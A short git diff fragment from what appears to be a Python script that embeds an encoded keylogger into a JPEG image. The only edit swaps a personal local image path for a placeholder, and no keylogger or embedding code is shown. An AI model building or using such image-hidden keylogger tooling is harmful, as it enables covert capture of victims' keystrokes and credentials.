@@ -22,7 +22,7 @@ def embed_into_image(image_path, encoded_keylogger, output_image):
 
 keylogger_path = 'keylogger6841.py'
 
-image_path = '/Users/zuranaftab/Downloads/unsw_0.jpg'
+image_path = '...'
 
 output_image = 'myimage.jpg'
 
